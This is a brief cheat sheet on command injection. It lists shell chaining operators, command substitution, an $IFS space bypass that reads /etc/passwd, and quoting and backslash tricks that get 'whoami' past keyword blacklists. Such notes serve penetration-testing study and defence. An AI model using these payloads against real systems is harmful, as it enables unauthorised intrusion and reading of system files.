# Command Injection

**Command injection** is a vulnerability that allows the execution of arbitrary commands on the host server, potentially leading to unauthorized access, data theft, or system compromise.

## Chaining and Invoking

Combining commands can be achieved (on both, Windows and Linux systems) using these operators

```powershell
;    # Executes one command and then another
&    # Executes a command in the background, followed by the other one
|    # Redirects the output the first command as input to the second command
&&   # Executes the second command if the first command succeeds
||   # Executes the second command if the first command fails
```

Its also possible to inject command via **command substitution**, where the output of a command is captured and used in another context

```bash
$(command)    # Both windows and linux systems
`command`     # Only linux systems
```

### Space Bypass

It is possible to use the **Internal Field Separator** `$IFS` to avoid using spaces on commands

```bash
cat${IFS}/etc/passwd
```

### Blacklisted Words

```bash
# Quotes
w'h'o'a'm'i'     # Both windows and linux systems
'w'h'o'a'm'i     # Only linux systems
wh''oami         # Both windows and linux systems

# Backslashes
\w\h\o\a\m\i     # Only linux systems
w\h\o\a\m\i      # Only linux systems

# $()
wh$()oami        # Only linux systems
wh$(echo oa)mi   # Only linux systems

# ``
wh``oami         # Only linux systems
wh`echo oa`mi    # Only linux systems

# $@
wh$@oami         # Only linux systems
```
